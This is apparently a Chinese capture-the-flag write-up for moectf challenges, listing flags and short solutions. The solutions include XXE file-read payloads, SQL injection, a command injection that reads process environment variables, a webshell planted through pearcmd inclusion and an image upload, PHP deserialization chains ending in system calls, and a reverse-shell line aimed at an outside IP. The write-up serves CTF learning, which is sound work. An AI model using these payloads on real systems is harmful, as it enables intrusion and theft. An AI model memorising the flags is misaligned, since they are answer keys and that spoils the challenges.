开头的文件打印出来。\n\n\n\n\nmoectf&#123;4ef3e96b-f34a-0bc3-5174-8e702603a155&#125;\n\n哈基米语南北绿豆奈哪买噶奈哪买南北绿豆；欧莫季里噶奈哪买噶奈哦吗吉利。哦吗吉利哪买噶奈哪椰奶龙？哈基米买娜奈哪买北窝那没撸多。哈基米多多压那奈椰奶龙；奈诺娜美嘎哪买娜奈哪买窝那没撸多？哦吗吉利噶奈哪买哈基米；窝那没撸多噶奈哪买噶奈哪哈基米。库路曼波买噶奈哪买哦吗吉利，哈基米娜奈哪买北南北绿豆，哦吗吉利多多压那多多欧莫季里。阿西噶压压那南撸基阿奈诺娜美嘎，哈基米南里南北友里窝那没撸多。库路曼波一吉豆没咕椰奶龙，库路曼波吉豆没咕吉豆椰奶龙。库路曼波没咕吉豆没咕库路曼波？哦吗吉利吉豆没米吉库路曼波。阿西噶压豆耶咕吉豆没米窝那没撸多；南北绿豆吉豆没米哈基米；窝那没撸多吉豆没咕吉奈诺娜美嘎。库路曼波豆没咕吉豆椰奶龙，欧莫季里没咕吉豆没咕吉南北绿豆？库路曼波豆没米吉豆欧莫季里。哦吗吉利耶咕吉豆没咕奶哈基米；窝那没撸多压多那吉豆没咕奈诺娜美嘎。阿西噶压吉豆没咕吉哦吗吉利；椰奶龙豆没咕吉豆没咕南北绿豆。窝那没撸多吉豆没米奶压哈基米，哈基米多那吉豆没米吉哈基米？奈诺娜美嘎豆没咕吉豆窝那没撸多，南北绿豆没咕吉豆没咕吉窝那没撸多，窝那没撸多豆没咕吉哦吗吉利；南北绿豆豆没咕吉豆没米窝那没撸多；南北绿豆吉豆耶咕吉豆椰奶龙。哈基米没米吉豆哈基米？库路曼波耶吗多奈哪买噶哈基米。哦吗吉利奈哪买噶奈哪阿西噶压；南北绿豆买噶奈哪窝那没撸多；阿西噶压买噶奈哪买阿西噶压；哈基米娜多多压那窝那没撸多？欧莫季里奈哪买北多奈诺娜美嘎；哦吗吉利多压那呀里欧西库路曼波。窝那没撸多奈哪买噶奈哈基米；南北绿豆哪买噶奈哪哦吗吉利，欧莫季里买噶奈哪买噶奈库路曼波，库路曼波哪买噶多多压那库路曼波。哈基米奈哪买噶奈哪买南北绿豆？椰奶龙娜奈哪买哈基米，窝那没撸多噶奈哪买奈诺娜美嘎？阿西噶压噶奈哪买噶奈哪哈基米，阿西噶压买噶奈哪买娜奈奈诺娜美嘎。奈诺娜美嘎哪买北奈哪买噶椰奶龙？哦吗吉利奈哪买北奈诺娜美嘎，窝那没撸多奈哪买噶奈哪窝那没撸多？阿西噶压买噶奈哪买噶奈欧莫季里。库路曼波哪买噶奈哈基米？阿西噶压哪买噶多多压那阿西噶压。窝那没撸多奈哪买北奈哪买阿西噶压；库路曼波噶奈哪买噶窝那没撸多。南北绿豆奈哪买噶奈哈基米；椰奶龙哪买噶奈哪买哦吗吉利；南北绿豆噶奈哪买哈基米；哈基米噶多多压那奈诺娜美嘎？窝那没撸多奈哪买北奈哦吗吉利，库路曼波哪买娜奈椰奶龙。哈基米哪买噶奈哪欧莫季里？椰奶龙买噶奈哪买噶阿西噶压。哈基米奈哪买噶奈奈诺娜美嘎？欧莫季里哪买噶多多压那哦吗吉利，阿西噶压奈哪买娜奈哪买哦吗吉利，南北绿豆娜奈哪买噶奈哪哈基米；库路曼波买噶奈哪买窝那没撸多。哈基米噶奈哪买南北绿豆；椰奶龙噶奈哪买噶多多窝那没撸多，阿西噶压压那奈哪买椰奶龙，欧莫季里娜奈哪买奈诺娜美嘎，阿西噶压北奈哪买噶奈哪库路曼波。库路曼波买噶奈哪买噶奈阿西噶压？哈基米哪买噶奈南北绿豆，南北绿豆哪买娜奈哪买哈基米；哦吗吉利北奈哪买噶奈椰奶龙，库路曼波哪买北奈窝那没撸多，阿西噶压哪买噶奈哪买奈诺娜美嘎；奈诺娜美嘎噶奈哪买噶奈欧莫季里，阿西噶压哪买噶奈哪窝那没撸多。南北绿豆买噶多多阿西噶压，窝那没撸多压那奈哪阿西噶压？椰奶龙买北奈哪奈诺娜美嘎；窝那没撸多买娜奈哪买噶奈椰奶龙？哦吗吉利哪买噶奈阿西噶压。哈基米哪买噶奈哪窝那没撸多；库路曼波买噶奈哪买噶奈欧莫季里。南北绿豆哪买北多多压那窝那没撸多；欧莫季里奈哪买娜奈哪买奈诺娜美嘎；椰奶龙噶奈哪买噶窝那没撸多，奈诺娜美嘎奈哪买噶奈阿西噶压；阿西噶压哪买噶奈哪买娜阿西噶压；椰奶龙奈哪买北奈欧莫季里。奈诺娜美嘎哪买噶奈阿西噶压，椰奶龙哪买娜奈哪买欧莫季里？库路曼波噶奈哪买库路曼波。阿西噶压噶奈哪买噶窝那没撸多；窝那没撸多奈哪买噶奈哪买南北绿豆？阿西噶压噶多多压那椰奶龙，库路曼波奈哪买娜哈基米；窝那没撸多奈哪买噶阿西噶压，库路曼波喔酷娜利步啊那窝那没撸多？南北绿豆吉豆没咕吉豆欧莫季里；欧莫季里没咕吉豆没南北绿豆？库路曼波咕吉豆没咕库路曼波。哈基米吉豆没咕哦吗吉利？哈基米奶压多那吉豆库路曼波，库路曼波没咕吉豆耶咕阿西噶压，椰奶龙吉豆没咕吉豆没窝那没撸多？阿西噶压咕吉豆没咕欧莫季里。奈诺娜美嘎吉豆没咕吉豆哈基米？欧莫季里没咕奶压多那吉库路曼波；阿西噶压豆没咕奶椰奶龙；奈诺娜美嘎压多那吉南北绿豆，窝那没撸多豆没咕吉欧莫季里；南北绿豆豆没咕吉豆奈诺娜美嘎。库路曼波没咕吉豆奈诺娜美嘎，南北绿豆没咕吉豆没咕吉窝那没撸多？库路曼波豆耶咕奶压多阿西噶压，哈基米那吉豆没米吉豆窝那没撸多；哈基米没咕吉豆没咕吉南北绿豆？奈诺娜美嘎豆没咕吉豆没奈诺娜美嘎；南北绿豆咕吉豆没南北绿豆。奈诺娜美嘎咕奶压多那吉奈诺娜美嘎？南北绿豆豆没米吉椰奶龙；椰奶龙豆没咕吉豆没窝那没撸多？欧莫季里咕吉豆没咕吉豆库路曼波；欧莫季里没咕吉豆没咕南北绿豆？奈诺娜美嘎吉豆没咕奶窝那没撸多；南北绿豆压多那吉豆没咕哈基米？欧莫季里吉豆没米吉豆欧莫季里；阿西噶压没咕吉豆奈诺娜美嘎；阿西噶压没咕吉豆没咕吉椰奶龙，哈基米豆没咕吉豆没阿西噶压？南北绿豆咕奶压多那椰奶龙。欧莫季里吉豆没咕吉豆没库路曼波；哈基米吗喵子路路吉阿西噶压，窝那没撸多豆没咕吉豆哦吗吉利；南北绿豆没咕吉豆阿西噶压？阿西噶压没咕吉豆没南北绿豆；哈基米咕吉豆没咕窝那没撸多；阿西噶压奶压多那吉椰奶龙；库路曼波豆没咕吉豆没米阿西噶压，奈诺娜美嘎吉豆没咕吉窝那没撸多。阿西噶压豆没咕吉窝那没撸多，阿西噶压豆没咕吉豆欧莫季里？库路曼波没咕吉豆没窝那没撸多，库路曼波咕吉豆耶咕奶压窝那没撸多？哦吗吉利多那吉豆没米阿西噶压。哈基米吉豆没咕吉欧莫季里；南北绿豆豆没咕吉欧莫季里。南北绿豆豆没咕吉豆没咕南北绿豆？椰奶龙吉豆没米吉豆椰奶龙；库路曼波耶咕吉豆没阿西噶压？欧莫季里咕吉豆没米南北绿豆；南北绿豆吉豆没咕吉豆没哈基米；哦吗吉利咕吉豆没咕吉奈诺娜美嘎？窝那没撸多豆没咕吉豆库路曼波，库路曼波没咕奶压多那吉阿西噶压。窝那没撸多豆没咕吉豆库路曼波？阿西噶压没西一奈哪买噶阿西噶压；哦吗吉利奈哪买噶哦吗吉利；椰奶龙奈哪买噶奈南北绿豆，库路曼波哪买噶奈哪买娜库路曼波，哈基米奈哪买北奈哪买窝那没撸多。欧莫季里噶奈哪买北奈哈基米，椰奶龙哪买噶奈库路曼波？南北绿豆哪买噶奈欧莫季里；哈基米哪买噶奈椰奶龙，奈诺娜美嘎哪买噶奈哪南北绿豆，库路曼波买娜奈哪哦吗吉利？阿西噶压买北奈哪买娜奈库路曼波。欧莫季里哪买噶奈欧莫季里，库路曼波哪买噶奈哪买欧莫季里？库路曼波噶奈哪买噶奈窝那没撸多；阿西噶压哪买噶奈阿西噶压；窝那没撸多哪买噶奈哪买北南北绿豆。库路曼波多多压那欧莫季里？欧莫季里奈哪买娜奈哪哦吗吉利；哈基米买噶奈哪买噶奈库路曼波，库路曼波哪买噶奈库路曼波？奈诺娜美嘎哪买噶奈哪阿西噶压，南北绿豆买噶多多压库路曼波；南北绿豆那奈哪买娜奈库路曼波，库路曼波哪买北奈哪椰奶龙，欧莫季里买噶奈哪买库路曼波。窝那没撸多噶奈哪买噶窝那没撸多，哈基米奈哪买噶阿西噶压。南北绿豆奈哪买噶多椰奶龙？哈基米多压那奈哪阿西噶压；库路曼波买娜奈哪买欧莫季里？库路曼波娜奈哪买噶奈欧莫季里；哈基米哪买噶奈哪椰奶龙。窝那没撸多买噶奈哪奈诺娜美嘎；椰奶龙买噶奈哪买库路曼波，阿西噶压娜奈哪买北椰奶龙。奈诺娜美嘎奈哪买噶奈哈基米；窝那没撸多哪买北奈哪哈基米。奈诺娜美嘎买噶奈哪买噶窝那没撸多？南北绿豆奈哪买噶欧莫季里，库路曼波奈哪买噶奈哪买库路曼波。南北绿豆娜奈哪买南北绿豆；欧莫季里北奈哪买娜奈哦吗吉利。哈基米哪买娜子窝那没撸多；南北绿豆酷波利子撸娜哪哈基米？哈基米哈里椰路阿西噶压，阿西噶压奈哪买噶奈哪哈基米。哈基米买噶奈哪买噶库路曼波？欧莫季里奈哪买噶奈哪南北绿豆，奈诺娜美嘎买噶多多椰奶龙；阿西噶压压那奈哪库路曼波；库路曼波买噶多多压那奈库路曼波；哦吗吉利哪买噶奈哪买哦吗吉利。椰奶龙噶奈哪买噶奈窝那没撸多，阿西噶压哪买噶奈哪买噶欧莫季里，库路曼波多多压那奈库路曼波；窝那没撸多哪买噶多多压那哈基米，窝那没撸多喔米哦啊呀砸奈诺娜美嘎；椰奶龙曼吉豆没咕南北绿豆；库路曼波吉豆没咕吉豆没阿西噶压？哦吗吉利咕吉豆没咕吉哦吗吉利；库路曼波豆没咕奶压库路曼波。库路曼波多那吉豆南北绿豆？奈诺娜美嘎没米吉豆库路曼波；哦吗吉利耶吗一奈哪买奈诺娜美嘎。椰奶龙噶奈哪买噶奈阿西噶压？哈基米哪买噶奈哪买噶窝那没撸多。南北绿豆奈哪买噶阿西噶压；窝那没撸多多多压那阿西噶压，阿西噶压奈哪买北奈阿西噶压，欧莫季里哪买噶奈哪买噶哈基米。哈基米奈哪买噶奈诺娜美嘎？哈基米奈哪买噶库路曼波。南北绿豆奈哪买噶奈哪阿西噶压，奈诺娜美嘎买噶多多压那欧莫季里；南北绿豆奈哪买噶哈基米，窝那没撸多奈哪买北奈哪买南北绿豆，欧莫季里噶奈哪买奈诺娜美嘎？哦吗吉利噶奈哪买哈基米；南北绿豆噶奈哪买南北绿豆；窝那没撸多噶奈哪买娜奈哪椰奶龙，欧莫季里买北奈哪买噶阿西噶压，库路曼波多多压那奈哪买哈基米；哈基米噶奈哪买噶窝那没撸多？欧莫季里奈哪买噶奈哪买哦吗吉利。阿西噶压噶奈哪买噶多哦吗吉利，阿西噶压多压那奈哪买阿西噶压，哈基米北奈哪买南北绿豆，南北绿豆噶奈哪买噶奈阿西噶压，欧莫季里哪买噶奈哦吗吉利。椰奶龙哪买噶奈哈基米，库路曼波哪买噶奈窝那没撸多，奈诺娜美嘎哪买噶多窝那没撸多，椰奶龙多压那奈哪买噶南北绿豆，阿西噶压奈哪买北奈哈基米；哈基米哪买噶奈哪奈诺娜美嘎，哦吗吉利买噶奈哪买噶奈阿西噶压，窝那没撸多哪买噶奈哪阿西噶压。窝那没撸多买娜多多椰奶龙；椰奶龙压那多多压奈诺娜美嘎；阿西噶压那奈哪买娜南北绿豆。哦吗吉利自米哦啊南北绿豆；奈诺娜美嘎南酷基压步酷欧莫季里；奈诺娜美嘎马美友喔奈诺娜美嘎；窝那没撸多诺哪呀喔喵欧莫季里；欧莫季里哩椰奶龙。\n\n用https://lhlnb.top/hajimi/base64解码得到\n‌‌‌‌‍‬﻿‍‌‌‌‌‍‬﻿﻿fakeflag‌‌‌‌‍‬‍‍‌‌‌‌‍‬‌﻿‌‌‌‌‍﻿‍‌‌‌‌‌‍‬‍‬&#123;‌‌‌‌‍﻿‬﻿you‌‌‌‌‌﻿‌‍‌‌‌‌‍‬‌‬‌‌‌‌‌﻿‬‌‌‌‌‌‌﻿‬‍‌‌‌‌‌﻿‍‍‌‌‌‌‌﻿‍‬‌‌‌‌‍‬‌‬‌‌‌‌‌﻿‬‍‌‌‌‌‌‬﻿‍‌‌‌‌‍‬‌‍‌‌‌‌‌﻿‍‌_can_‌‌‌‌‌﻿‌‬‌‌‌‌‌﻿‌﻿‌‌‌‌‌‬﻿‍‌‌‌‌‌﻿‍‌‌‌‌‌‌﻿‌‍‌‌‌‌‌﻿‌‌try‌‌‌‌‌﻿‌‍‌‌‌‌‌‬﻿‍‌‌‌‌‍‬‌‍‌‌‌‌‌﻿‌‍_‌‌‌‌‍‬‌‬‌‌‌‌‍‬‍‌‌‌‌‌‌‬﻿‍‌‌‌‌‌﻿‍‬‌‌‌‌‌﻿‍‍‌‌‌‌‍‬‌‬‌‌‌‌‍‬‍‍searching‌‌‌‌‌﻿‌﻿‌‌‌‌‌﻿‌﻿_text‌‌‌‌‌﻿‍‬_‌‌‌‌‌﻿‬‌‌‌‌‌‌﻿‌‬‌‌‌‌‍‬‌﻿‌‌‌‌‌﻿‬‌‌‌‌‌‌﻿‌‬‌‌‌‌‍﻿﻿‍Steganography&#125;\n\n用零宽字符解密即可\n\nmoectf&#123;1b8956b9-a423-4101-a1bd-65be33682c82&#125;\n\nweb1.控制台丢jsfuck即可\n\nmoectf&#123;jv@vScr1p7_14_so0o0o0o_inT3r3&amp;t!!!&#125;\n\n2.\nmoectf&#123;f_i2_1s_Your_g00d_fri3nd!!&#125;\n\n3.第一个页面源代码得到路由&#x2F;golden_trail,访问之后抓包\n\nmoectf&#123;0bs3rv3_Th3_Gold3n_traiL&#125;\n\n4.抓包改参数即可\n记得要用POST的方式发包,原因可以看js代码\n\nmoectf&#123;g3T_P05T-TransmISsiON_1S-a-Go0d-mEtHOd!!1218&#125;\n\n5.目录穿越\n\nmoectf&#123;41I_1NpuT-Is_mA1ICi0u557f1e193&#125;\n\n6.第一关get传参\n\nbW9lY3Rme0Mw\n\n第二关post传参\n\nbjZyNDd1MTQ3\n\n第三关改xff头\n\nMTBuNV95MHVy\n\n第四关改ua头\n\nX2g3N1BfbDN2\n\n第五关:cookie改成如下\n\nM2xfMTVfcjM0\n\n第六关:\n\nbGx5X2gxOWgh\n\n第七关:发送put请求\nimport requestsurl = &quot;http://192.168.0.114:50602/void_rebirth&quot;data = &quot;新生！&quot;headers = &#123;    &quot;Content-Type&quot;: &quot;text/plain&quot;&#125;response = requests.put(url, data=data, headers=headers)print(response.status_code)print(response.text)\n\n\nfQ==\n\n整合起来\nbW9lY3Rme0MwbjZyNDd1MTQ3MTBuNV95MHVyX2g3N1BfbDN2M2xfMTVfcjM0bGx5X2gxOWghbGx5X2gxOWghfQ==moectf&#123;C0n6r47u14710n5_y0ur_h77P_l3v3l_15_r34lly_h19h!lly_h1&#125;\n\n7.万能密码就能登录\n\nmoectf&#123;w3IcoMe-T0-5QI_InjECtlOnl1137fd3f6&#125;\n\n8.\n&lt;?phphighlight_file(__FILE__);$flag = getenv(&#x27;FLAG&#x27;);$a = $_GET[&quot;a&quot;] ?? &quot;&quot;;$b = $_GET[&quot;b&quot;] ?? &quot;&quot;;if($a == $b)&#123;    die(&quot;error 1&quot;);&#125;if(md5($a) != md5($b))&#123;    die(&quot;error 2&quot;);&#125;echo $flag; error 1\n\nQNKCDZO240610708s878926199as155964671as214587387as214587387a挑两个上去\n\n\nmoectf&#123;mdS-lS_NoT-5AF3!!43995d17e&#125;\n\n9.sqlmap秒了\n\nmoectf&#123;UnIOn_bASeD_Sq1I-ftW!!1a1580091&#125;\n\n10.雪瞳找到有&#x2F;static&#x2F;main.js文件\n\nlet randomNumber = Math.floor(Math.random()*10000) + 1; // 1-10000const guesses = document.querySelector(&#x27;.guesses&#x27;);const lastResult = document.querySelector(&#x27;.lastResult&#x27;);const lowOrHi = document.querySelector(&#x27;.lowOrHi&#x27;);const guessBtn = document.getElementById(&#x27;guessBtn&#x27;);const guessField = document.getElementById(&#x27;guessField&#x27;);let guessCount = 1;let resetButton;function checkGuess() &#123;  let userGuess = Number(guessField.value);  if(guessCount === 1) &#123;    guesses.textContent = &#x27;上次猜的数：&#x27;;  &#125;  guesses.textContent += userGuess + &#x27; &#x27;;  if(userGuess === randomNumber) &#123;    lastResult.textContent = &#x27;恭喜你！猜对了！&#x27;;    lastResult.style.backgroundColor = &#x27;green&#x27;;    lowOrHi.textContent = &#x27;&#x27;;    guessField.disabled = true;    guessBtn.disabled = true;    // 猜对后请求flag    fetch(&#x27;/flag&#x27;, &#123;method: &#x27;POST&#x27;&#125;)      .then(res =&gt; res.json())      .then(data =&gt; &#123;        document.querySelector(&#x27;.flagResult&#x27;).textContent = &quot;FLAG: &quot; + data.flag;      &#125;);    setGameOver();  &#125; else &#123;    lastResult.textContent = &#x27;!!!游戏结束!!!&#x27;;    lastResult.style.backgroundColor = &#x27;red&#x27;;    if(userGuess &lt; randomNumber) &#123;      lowOrHi.textContent = &#x27;你刚才猜低了！&#x27;;    &#125; else if(userGuess &gt; randomNumber) &#123;      lowOrHi.textContent = &#x27;你刚才猜高了！&#x27;;    &#125;    guessField.disabled = true;    guessBtn.disabled = true;    setGameOver();  &#125;  guessCount++;  guessField.value = &#x27;&#x27;;  guessField.focus();&#125;guessBtn.addEventListener(&#x27;click&#x27;, checkGuess);function setGameOver() &#123;  resetButton = document.createElement(&#x27;button&#x27;);  resetButton.textContent = &#x27;开始新游戏&#x27;;  document.body.appendChild(resetButton);  resetButton.addEventListener(&#x27;click&#x27;, resetGame);&#125;function resetGame() &#123;  guessCount = 1;  const resetParas = document.querySelectorAll(&#x27;.resultParas p&#x27;);  for(let i = 0; i &lt; resetParas.length; i++) &#123;    resetParas[i].textContent = &#x27;&#x27;;  &#125;  resetButton.parentNode.removeChild(resetButton);  guessField.disabled = false;  guessBtn.disabled = false;  guessField.value = &#x27;&#x27;;  guessField.focus();  lastResult.style.backgroundColor = &#x27;white&#x27;;  randomNumber = Math.floor(Math.random()*10000) + 1; // 1-10000&#125;\n\n控制台直接看randomNumber\n\nmoectf&#123;5d439f1c-d610-e49a-f283-6711656c040b&#125;\n\n11.第十四章 御神关·补天玉碑传.htaccess再传个图片马,flag在根目录\n\n12.第十章 天机符阵_revenge一个文本框,随便输入什么进去\n\nxxe漏洞,payload:\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE 阵枢 [  &lt;!ENTITY hacker SYSTEM &quot;file:///flag.txt&quot;&gt;]&gt;&lt;阵枢&gt;  &lt;解析&gt;&amp;hacker;&lt;/解析&gt;  &lt;输出&gt;未定义&lt;/输出&gt;&lt;/阵枢&gt;\n\n\nmoectf&#123;1e866128-7abe-4caa-e010-36d7bf49ab10&#125;\n\n13.摸金偶遇FLAG，拼尽全力难战胜(() =&gt; &#123;    if (!window.__hooked__) &#123;        const origFetch = window.fetch;        window.fetch = async (...args) =&gt; &#123;            const res = await origFetch(...args);            if (args[0].includes(&#x27;/get_challenge&#x27;)) &#123;                res.clone().json().then(data =&gt; &#123;                    console.log(&#x27;=== 获取到真实答案 ===&#x27;, data.numbers);                    window.__answer__ = data.numbers;                &#125;);            &#125;            return res;        &#125;;        window.__hooked__ = true;        console.log(&#x27;已挂载答案抓取 Hook，请点击开始挑战按钮&#x27;);        return;    &#125;    if (!window.__answer__) &#123;        console.error(&#x27;还没获取到答案，请先点击开始挑战按钮&#x27;);        return;    &#125;    const code = window.__answer__;    const buttons = document.querySelectorAll(&#x27;.inputContentBtnAreaItem&#x27;);    if (!buttons.length) &#123;        console.error(&#x27;未找到数字按钮，请确保挑战界面已加载&#x27;);        return;    &#125;    let i = 0;    function clickNext() &#123;        if (i &gt;= code.length) &#123;            console.log(&#x27;=== 自动通关完成 ===&#x27;);            return;        &#125;        const num = code[i];        const btn = Array.from(buttons).find(b =&gt; b.textContent.trim() === String(num));        if (btn) &#123;            btn.click();            console.log(`输入第$&#123;i+1&#125;位：$&#123;num&#125;`);        &#125; else &#123;            console.error(`找不到数字按钮：$&#123;num&#125;`);        &#125;        i++;        // 高速但保留间隔，100ms 已经非常快        setTimeout(clickNext, 100);    &#125;    clickNext();&#125;)();\n\n\nmoectf&#123;53a0d1ed-ed64-9a27-8e42-8de2ccedd45c&#125;\n\n14.第十三章 通幽关·灵纹诡影\n灵纹必须包含噬心魔印（十六进制校验码：FFD8FF）\n\n在jpg尾部加一句话木马即可\n\nmoectf&#123;8bc69f8d-67fc-fa57-64cf-58e31cae34c3&#125;\n\n15.第十章 天机符阵&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE 阵枢 [  &lt;!ENTITY hacker SYSTEM &quot;file:///var/www/html/flag.txt&quot;&gt;]&gt;&lt;阵枢&gt;  &lt;解析&gt;&amp;hacker;&lt;/解析&gt;  &lt;输出&gt;&lt;/输出&gt;&lt;/阵枢&gt;\n\n\nmoectf&#123;G00d_7o6_4nD_XX3_Unl0ck_St4r_S34l&#125;\n\n16.第十二章 玉魄玄关·破妄flag在环境变量\n\nmoectf&#123;715601ed-5928-ec1b-b19c-08e6ebd67f72&#125;\n\n17.HDdss看到了 GET 参数名由m,n,o,p,q这五个字母组成（每个字母出现且仅出现一次），长度正好为 5，虽然不清楚字母的具体顺序，但是他知道参数名等于参数值才能进入\n\n先准备好参数和值\nimport itertools# 字母列表letters = [&#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;]# 生成所有可能的排列permutations = list(itertools.permutations(letters))# 打开文件并写入with open(&#x27;1.txt&#x27;, &#x27;w&#x27;) as file:    for perm in permutations:        # 将排列转换为字符串        param = &#x27;&#x27;.join(perm)        # 写入 ?xxxxx=xxxxx 格式        file.write(f&#x27;?&#123;param&#125;=&#123;param&#125;\\n&#x27;)\n\n放在bp里爆破\n\n用得到的参数和值访问,用伪协议读.&#x2F;flag.php\nphp://filter/read=convert.base64-encode/resource=./flag.php\n\n\nPD9waHANCmVjaG8gImZsYWflsLHlnKjov5nkuobvvIznnIvkuI3liLDlkJfvvIzmmK/ogIHlvJ/looPnlYzkuI3lpJ/lkKciOw0KLy9tb2VjdGZ7ZGJkOTFlOTItZDI4Yi0zYTMwLWMyNjItMWNhNDNjOWE1M2MyfQ==moectf&#123;dbd91e92-d28b-3a30-c262-1ca43c9a53c2&#125;\n\n18.127.0.0.1; cat /proc/self/environ | grep -i flag\n\n\nmoectf&#123;ee2f1402-c648-2d0b-52ed-f5b30d41e8f6&#125;\n\n19.给了几个附件\nindex.php&lt;?phperror_reporting(0);highlight_file(__FILE__);include($_GET[&#x27;file&#x27;] . &quot;.php&quot;);php.ini[PHP]allow_url_fopen = Onallow_url_include = Onentrypoint.sh#!/bin/bashecho $FLAG &gt; /flag-$(cat /dev/urandom | tr -dc &#x27;a-zA-Z0-9&#x27; | head -c 30).txtunset FLAGapache2-foreground\n\n首先尝试了反弹shell\n&lt;?phpsystem(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/http://47.122.131.175//2333 0&gt;&amp;1&#x27;&quot;);?&gt;没用\n\n发现是pearcmd文件包含\nhttps://blog.csdn.net/m0_56019217/article/details/143868969\nhttp://127.0.0.1:52970/?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/%3C?=eval($_POST[1]);?%3E+/var/www/html/shell.php\n\n这一步要用bp传,然后访问shell.php即可rce\n\nmoectf&#123;295f1bc5-65de-55a1-2f82-0c41669e1bf5&#125;\n\n20.&lt;?phphighlight_file(__FILE__);class A &#123;    public $a;    function __destruct() &#123;        eval($this-&gt;a);    &#125;&#125;if(isset($_GET[&#x27;a&#x27;])) &#123;    unserialize($_GET[&#x27;a&#x27;]);&#125;\n\n&lt;?phpclass A &#123;    public $a = &quot;system(&#x27;ls /&#x27;);&quot;;&#125;$a = new A();echo serialize($a);&lt;?phpclass A &#123;    public $a = &quot;system(&#x27;cat /f*&#x27;);&quot;;&#125;$a = new A();echo serialize($a);\n\n\nmoectf&#123;b7e12fcd-b8c3-edcf-db0a-e85c070d7b45&#125;\n\n21.&lt;?phphighlight_file(__FILE__);class PersonA &#123;    private $name;    function __wakeup() &#123;        $name=$this-&gt;name;        $name-&gt;work();    &#125;&#125;class PersonB &#123;    public $name;    function work()&#123;        $name=$this-&gt;name;        eval($name);    &#125;&#125;if(isset($_GET[&#x27;person&#x27;])) &#123;    unserialize($_GET[&#x27;person&#x27;]);&#125;\n\n通过personA调用personB中的work()方法触发eval,想要把一个对象赋值给一个对象属性，而且还是私有的属性，我们不能直接赋值，也不能在外面赋值，但是我们可以使用 __construct 构造函数来赋值\n&lt;?phpclass PersonA &#123;    private $name;    public function __construct($xxx) &#123;        $this-&gt;name = $xxx;    &#125;&#125;class PersonB &#123;    public $name = &quot;system(&#x27;cat /f*&#x27;);&quot;; // 任意PHP代码&#125;$b=new personB();$a=new PersonA($b);echo urlencode(serialize($a));?&gt;moectf&#123;84e140ac-1a09-8161-6c26-78c2c6517bfe&#125;\n\n22.&lt;?phphighlight_file(__FILE__);class Person&#123;    public $name;    public $id;    public $age;    public function __invoke($id)    &#123;        $name = $this-&gt;id;        $name-&gt;name = $id;        $name-&gt;age = $this-&gt;name;    &#125;&#125;class PersonA extends Person&#123;    public function __destruct()    &#123;        $name = $this-&gt;name;        $id = $this-&gt;id;        $age = $this-&gt;age;        $name-&gt;$id($age);//漏洞点,把$name赋值为对象,方法名为 $id，参数为 $age    &#125;&#125;class PersonB extends Person&#123;    public function __set($key, $value)    &#123;        $this-&gt;name = $value;    &#125;&#125;class PersonC extends Person&#123;    public function __Check($age)    &#123;        if(str_contains($this-&gt;age . $this-&gt;name,&quot;flag&quot;))        &#123;            die(&quot;Hacker!&quot;);        &#125;        $name = $this-&gt;name;        $name($age);    &#125;    public function __wakeup()    &#123;        $age = $this-&gt;age;        $name = $this-&gt;id;        $name-&gt;age = $age;        $name($this);    &#125;&#125;if(isset($_GET[&#x27;person&#x27;]))&#123;    $person = unserialize($_GET[&#x27;person&#x27;]);&#125;\n\n漏洞分析和利用链路PersonA::__destruct()：$name = $this-&gt;name;$id = $this-&gt;id;$age = $this-&gt;age;$name-&gt;$id($age);  // 这里动态调用方法：对象 $name 的方法名为 $id，参数为 $age。我们可以将 $name 设置为一个 PersonC 对象，$id 设置为 &quot;__Check&quot;，$age 设置为 &quot;cat flag&quot;，从而调用 PersonC::__Check(&quot;cat flag&quot;)。PersonC::__Check($age)：先检查 if (str_contains($this-&gt;age . $this-&gt;name, &quot;flag&quot;)) die(&quot;Hacker!&quot;);我们设置 PersonC 的 $age = &quot;&quot;，$name = &quot;system&quot;，所以 &quot;&quot; . &quot;system&quot; = &quot;system&quot;，不包含 &quot;flag&quot;，绕过检查。然后 $name = $this-&gt;name;（即 &quot;system&quot;）$name($age);  // 这里 $name 是字符串 &quot;system&quot;，但在 PHP 中，如果字符串是内置函数名，可以直接作为函数调用：system(&quot;cat flag&quot;)，实现命令执行。PersonC::__wakeup()：在反序列化时会调用（因为 PersonC 是 PersonA 的属性）。内部逻辑：设置一些属性并调用 __invoke()。在这个利用中，我们利用它来辅助设置对象链：PersonC 的 $id 设置为一个 Person 对象（内嵌另一个 Person），以便在 __wakeup() 中触发 __invoke() 来调整属性（虽然在本链路中不是核心，但需要匹配序列化结构以确保反序列化成功）。Person::__invoke($id)：在 __wakeup() 中被调用，用于设置嵌套对象的属性（如 $name-&gt;name = $id; 等）。这部分确保对象链完整，但不直接参与命令执行。绕过点：检查只针对 $this-&gt;age . $this-&gt;name，不检查参数 $age，所以 &quot;cat flag&quot; 可以包含 &quot;flag&quot; 而不会触发 die。PersonB::__set() 未在本利用中使用。总体链路：反序列化 PersonA → 调用 __wakeup()（在 PersonC 上，设置嵌套属性） → 脚本结束调用 PersonA::__destruct() → 调用 PersonC::__Check(&quot;cat flag&quot;) → 绕过检查 → 调用 system(&quot;cat flag&quot;)。\n\n&lt;?phpclass Person &#123;    public $name;    public $id;    public $age;&#125;class PersonA extends Person &#123;    // 无需实现方法，只需类定义&#125;class PersonB extends Person &#123;    // 未使用，但定义以完整&#125;class PersonC extends Person &#123;    // 无需实现方法，只需类定义&#125;// 创建嵌套对象链// 最内层：一个空 Person 对象 (P2)$p2 = new Person();  // 无属性设置，序列化为 O:6:&quot;Person&quot;:0:&#123;&#125;// 中层：一个 Person 对象 (P1)，其 id = P2$p1 = new Person();$p1-&gt;id = $p2;  // name 和 age 未设置，序列化时不出现// PersonC 对象 (PC)$pc = new PersonC();$pc-&gt;name = &quot;system&quot;;  // 用于最终调用 system()$pc-&gt;id = $p1;         // 用于 __wakeup() 中的嵌套调用$pc-&gt;age = &quot;&quot;;         // 用于绕过 __Check() 中的 str_contains 检查// PersonA 对象 (PA)$pa = new PersonA();$pa-&gt;name = $pc;       // destruct 时调用此对象的 __Check()$pa-&gt;id = &quot;__Check&quot;;   // 方法名$pa-&gt;age = &quot;cat flag&quot;; // 参数，传递给 system()// 序列化 PersonA 对象$serialized = serialize($pa);echo $serialized . 